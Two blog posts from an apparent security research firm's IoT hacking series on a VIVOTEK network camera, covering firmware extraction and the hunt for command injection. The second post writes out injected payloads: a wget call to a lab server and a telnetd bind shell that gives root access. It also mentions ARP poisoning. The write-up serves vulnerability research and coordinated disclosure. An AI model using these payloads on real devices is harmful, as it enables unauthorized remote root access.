# Professional IoT Hacking Series: Target Selection & Firmware Analysis

[Home](https://www.vdalabs.com/) [Cybersecurity Insights](https://www.vdalabs.com/from-the-experts/) **Professional IoT Hacking Series: Target Selection & Firmware Analysis**

[Exploit Development](https://www.vdalabs.com/category/exploit-development/)

![professional IOT hacking](data:image/svg+xml...)

When considering where to spend limited penetration testing resources, most organizations (and penetration testing shops) focus on the typical mix of servers and workstations normally found in every organization. While this is a necessary area of focus, other things like that IoT device sitting on the edge of a network can be quite the playground for hackers that are willing to do a little reverse engineering. In this blog series on “Professional IoT Hacking,” VDA Labs will demonstrate some of the ways we attack IoT devices and hopefully communicate just how damaging these devices can be to an organization’s security posture.

## Time warp to the 1990’s

Most modern, traditional operating systems (that are used on things like servers and workstations) have the security advantages of years of use across many different organizations and vetting by talented security researches. Centralized methods for releasing security updates and layers of additional protections have been added over the years. For example, at one point Windows did not have Executable space protection (DEP), Address space layout randomization (ALSR), or even stack canaries. These memory corruption protections were all developed to make it harder for attackers to abuse control flow hijacking.

With the rise of IoT, it would have been wonderful if all the lessons learned from traditional operating system security were implemented as a new security baseline, but that is often not the case. Due to the embedded nature of many IoT operating systems, traditional operating system security hardening is thrown out window — which means its like being time warped back to the 1990’s for attackers trying to find exploits. Perhaps in the rush to beat competitors to market first, many modern IoT device operating systems and applications seem to be missing even the basics of input sanitization, resulting in a playground for exploit developers. Is your organization really considering the risk that IoT devices bring to your networks? Hopefully, the following articles in this blog series will help bring awareness to just how vulnerable modern IoT devices are.

## Selecting our research target

To demonstrate how we go about finding vulnerabilities in modern IoT devices (network cameras, connected cars, building controllers, ICS, routers, etc), VDA Labs decided to spend a few hours of focused research time on a particular IoT camera. This device first came on our radar during an actual penetration test. While looking for ways to pivot into a restricted internal network subnet, for some reason access to this IoT camera running inside the restricted subnet was allowed. By dynamically fuzzing the web interface for this particular IoT camera, a zero day command execution vulnerability was discovered, which allowed a foothold to be established inside the restricted subnet.

The device chosen is a fully patched and update version of [VIVOTEK’s FD8136](https://www.vivotek.com/fd8136/). The only reason VDA decided to pick this device for research is because we stumbled across it during a penetration test, but one thing to note is that this device dose not have any disclosed [Common Vulnerabilities and Exposures](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures) (CVE). Many people might think this is a good sign, and would perhaps prefer that the device or software they use have a clean CVE track record, but in our experience a lack of CVE history is typically because the device or software has not been properly vetted for vulnerabilities. We prefer to use devices and software that have a good track record of mitigating disclosed vulnerabilities.

![Vivotek CVEs](data:image/svg+xml...)
## Decompressing target firmware

Throughout this blog series on Professional IoT Hacking, we plan to demonstrate several different types of static and dynamic analysis that can be used to assess any IoT device. To that end, we purchased a fully functional version of the target device for dynamic analysis and fuzzing, but an obvious place to get started was reverse engineering target device firmware. As with lots of IoT devices, the latest version of the firmware (version 0301a) was available online for [public download](http://download.vivotek.com/downloadfile/downloads/firmware/fd8136firmware.zip). In cases where the firmware for a target device is not easily available, it is often possible to obtain a Man-in-the-middle position on the target device in your research lab, then capture new device firmware off the wire when it downloads. Common methods for doing this include sniffing wireless interface traffic with [Wireshark](https://www.wireshark.org/), using an ethernet tap device like the [Throwing Star LAN Tap](https://greatscottgadgets.com/throwingstar/) or [Packet Squirrel](https://www.hak5.org/gear/packet-squirrel), or simply using ARP poisoning on a local subnet to sniff traffic between the target device and its internet gateway.

After downloading the firmware, we opened the ZIP file with a linux virtual machine, and quickly noticed the file “FD8136-VVTK-0301a.flash.pkg” as probably containing the firmware we want to decompress.

![Downloaded firmware](data:image/svg+xml...)![Downloaded firmware](https://www.vdalabs.com/wp-content/uploads/2024/01/downloaded-firmware-600x170-1.png)

Running the “file” command simply returned “data” so we turned to [Binwalk](https://github.com/ReFirmLabs/binwalk), our favorite firmware decompression tool. In the screen capture below, the command “binwalk -e -M ./FD8136-VVTK-0301a.flash.pkg” was used to recursively decompress our target FD8136 Network Camera firmware. We have found that Binwalk typically works best on a Linux distro, like Ubuntu or Debian — sometimes it does not work as well when trying to use it on Mac OSX.

![binwalk](data:image/svg+xml...)![binwalk](https://www.vdalabs.com/wp-content/uploads/2024/01/binwalk1-600x283-1.png)

During the decompression process, Binwalk recursively identified [LZMA](https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Markov_chain_algorithm) compressed data, a [squashfs](https://en.wikipedia.org/wiki/SquashFS) file system, and eventually decompressed ARM 32-bit ELF files. This information will come in handy later when doing things like reverse engineering and fuzzing the ARM binaries for memory corruption vulnerabilities or searching cgi scripts for command injection.

![binwalk](data:image/svg+xml...)![binwalk](https://www.vdalabs.com/wp-content/uploads/2024/01/binwalk2-600x195-1.png)

At this point, we have successfully decompressed the firmware and have full access to the underlying filesystem that would be running on the actual device. This contains loads of helpful information about the device, like the path “../squashfs-root/etc/” contains config files, but one particular path of interest is “../squashfs-root/usr/share/www/cgi-bin/,” because it contains the scripts and binaries that are used to manage the device from its web interface. Later in this blog series, we will find that several of these are exposed to non-authenticated users via the [Boa web server](http://www.boa.org/) interface running on TCP port 80.

![filesystem](data:image/svg+xml...)![filesystem](https://www.vdalabs.com/wp-content/uploads/2024/01/filesystem-600x257-1.png)
## Next steps

At this point in the process, we have picked a research target and successfully downloaded and decompressed firmware that will actually be running on the device. Quick analysis of the decompressed firmware uncovered attack surface that will be of interest (Boa web server) when later attempting to remotely exploit the device. Future posts in this “Professional IoT Hacking” series will cover fun topics like using [IDA Pro](https://www.hex-rays.com/products/ida/) to statically identify memory corruption vulnerabilities in ARM binaries, using [BurpSuite Pro](https://portswigger.net/burp) to dynamically fuzz the web management interface for command injection and memory corruption, emulating ARM binaries for fuzzing with [QEMU](https://www.qemu.org/), using [GDB](https://www.gnu.org/software/gdb/) to help with exploitation of memory corruption vulnerabilities, possibly dumping device firmware with [JTAGulator](http://www.grandideastudio.com/jtagulator/), and more. As a side note to this blog series, VDA Labs will be using a [Coordinated Vulnerability Disclosure process](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=4718642) for the zero day vulnerabilities identified during this research.  (Follow CVE-2018-14494, CVE-2018-14495, and CVE-2018-14496.)

# Professional IoT Hacking Series: Hunting Remote Command Injection

[Home](https://www.vdalabs.com/) [Cybersecurity Insights](https://www.vdalabs.com/from-the-experts/) **Professional IoT Hacking Series: Hunting Remote Command Injection**

[Exploit Development](https://www.vdalabs.com/category/exploit-development/)

![Pro IOT Hacking](data:image/svg+xml...)

Finding and exploiting command injection vulnerabilities can have tremendous reward for the time invested. One thing that makes this type of vulnerability extremely nasty in IoT/embedded devices, is that web server processes are often running with root privileges — this means there is no further privilege escalation needed to obtain full control of the target device. Injecting and running shellcode is also not necessary like with memory corruption vulnerabilities. IoT devices seem to be full of command execution vulnerabilities because often the code running on web management interfaces is made up of simple scripts (like python or CGI) that simply accept input and feed it straight to operating system commands. In a more modern web application built with [Multitier architecture](https://en.wikipedia.org/wiki/Multitier_architecture), and using concepts like [MVC](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93presenter), additional layers of sanitization and strong typing exist that can help prevent command injection vulnerabilities.

## Initial dynamic analysis pass

In the [first post](https://www.vdalabs.com/professional-iot-hacking-series-target-selection-firmware-analysis/) of this “Professional IoT Hacking” series, we decompressed the firmware for our target [Vivotek FD1836 network camera](https://www.vivotek.com/fd8136/), and identified the filesystem location for scripts and binaries being used by a [Boa web server](http://www.boa.org/) management interface. In order to have a fully functioning version for dynamic analysis, we purchased the device, connected it to a Power over Ethernet (PoE) connection, and placed it inside a lab network. Upon booting the device, it was possible to interact with the web management interface so we piped our browser traffic through the interception proxy [Burp Suite](https://portswigger.net/burp) and proceeded to map out the web application. As can be observed in the screen captures below, the web management interface seems to mirror the files identified in the decompressed firmware.

![burp suite files](data:image/svg+xml...)

By simply using Burp Suite’s scanner functionality to dynamically fuzz all of the web request inputs, we did not discover command injection. In addition to that, the tool [commix](https://github.com/commixproject/commix) was used to dynamically fuzz for command execution, without any successful results. Both of these tools are great for dynamic analysis, but such out-of-the-box automation is only useful to a point. How can we improve our command injection fuzzing to hunt deeper bugs? What information can we glean from static analysis of the firmware that could be used to improve our command injection fuzzing? How can we succeed where most dynamic-only assessments would give up?

## Combining static and dynamic analysis

One advantage we have on the static analysis front is the ability to view information about binaries that are running on the actual device. If we view the contents of “../squashfs-root/usr/bin/” we can observe that busybox is being used. We also notice that busybox supports the “wget” command. In our first pass at fuzzing web parameters for command injection, we wondered: did our toolset provide full coverage of binary paths, and did the automation check for remote blind command injection by attempting to trigger commands like “ping,” “nslookup,” or “wget?”

![wget console](data:image/svg+xml...)![wget console](https://www.vdalabs.com/wp-content/uploads/2024/07/wget-1-600x255-1.png)

Taking this information from statically analyzing the decompressed firmware, what would happen if we tried injecting a full path to the “wget” binary or symbolic link and specified a remote web server? Its time to try this method out with Burp Suite repeater. On the left side of the screen capture below, we captured a request between our browser and the web management interface of the target device, injected a full path reference to the “wget” binary with a specified remote web server(/usr/bin/wget http://192.168.2.2:8000/whatthe?), and then replayed the request to our device. On the right side of the screen capture below, our remote web server at http://192.168.2.2:8000 received a request for the “whatthe?” page from our target device.

![](data:image/svg+xml...)![](https://www.vdalabs.com/wp-content/uploads/2024/07/image9-600x201-1.png)

This successfully demonstrates that we obtained blind remote command execution. By using static analysis of the decompressed firmware and combining it with manual injection attempts, we were able to succeed where simple dynamic-only analysis might not. We used this methodology to find another command injection vulnerability in our target device. Both command injection vulnerabilities are pending CVE numbers (CVE-2018-14494, CVE-2018-14495).

## Lets rain some shellz

On many IoT devices, the common ways to quickly create reverse and bind shells for remote command and control (C2) are not always there. For example, our target device does not support many of the common languages like perl, python, ruby, or php. Lets examine the device to look for something native we can use to establish remote C2. We could use “wget” to download and then execute an ARM binary stager, but that would place artifacts on disk. After a little more digging around the decompressed firmware, we located the “telnet” and “telnetd” binaries.

![](data:image/svg+xml...)![](https://www.vdalabs.com/wp-content/uploads/2024/07/image5.png)

Using “telnetd” for a remote shell should do the trick. Besides simply using the “telnetd” binary to create a simple bind shell, [this reverse shell cheat sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/) contains a great way to establish a remote shell from the target device to an IP address of our choice. By injecting the payload “/usr/sbin/telnetd -p37 /bin/sh,” a successful bind shell on TCP port 37 was established. On the right side of the screen capture below, you can see that we connected to our target device over TELNET as the “root” user.

![](data:image/svg+xml...)![](https://www.vdalabs.com/wp-content/uploads/2024/07/shell-1-600x191-1.png)
## Next steps

In this post we covered some basics about hunting command injection and learned that we can typically find vulnerabilities faster by leveraging static and dynamic analysis together. One of the things we noticed about this device is that some of the web management functionality is composed of simple CGI scripts, and other components are actual 32-bit ARM binaries. In the next post in this “Professional IoT Hacking” series, we will extract some of the ARM binaries and perform some static analysis to hunt memory corruption vulnerabilities with [IDA Pro](https://www.hex-rays.com/products/ida/).
